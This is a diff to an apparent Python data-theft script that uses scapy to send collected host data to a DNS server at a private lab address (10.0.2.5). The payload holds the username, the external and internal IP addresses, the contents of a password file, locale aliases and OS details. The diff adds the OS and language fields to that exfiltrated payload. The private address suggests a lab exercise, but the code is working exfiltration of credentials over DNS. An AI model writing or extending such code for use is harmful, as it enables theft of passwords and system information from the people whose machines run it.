@@ -1,9 +1,8 @@
+import locale
 import sys
 import os
 import platform
 import getpass
-import socket
-import locale
 from requests import get
 from scapy.all import *
 from scapy.layers.dns import DNS, DNSQR, DNSRR
@@ -11,6 +10,13 @@ from scapy.layers.inet import UDP, IP
 
 DNS_port = 53
 DNS_server_ip = "10.0.2.5"
+
+
+def get_os_info():
+    os_name = os.name
+    os_version = os.uname().release
+    os_info = f"{os_name} {os_version}"
+    return os_info
 
 
 def exe_file():
@@ -35,12 +41,16 @@ def exe_file():
 
     print("Building data packet to send to DNS server")
 
+    passwords = str(password_file)
+    os_info = get_os_info()
+    print(os_info)
+
     data_to_send = "username: " + username + "\n" \
                    + "\n" + "external ip address: " + ip \
                    + "\n" + "internal ip address: " + ip_internal \
-                   + "\n" \
-                   + "Password file data:\n\n" + str(password_file)
-                   # + "\n" + "Languages: " + str(locale.locale_alias) \
+                   + "\n" + "Password file data:\n\n" + passwords \
+                   + "\n" + "Languages: " + str(locale.locale_alias) \
+                   + "\n" + "operating system: " + get_os_info()
 
     print("Sending data packet to DNS server")
 
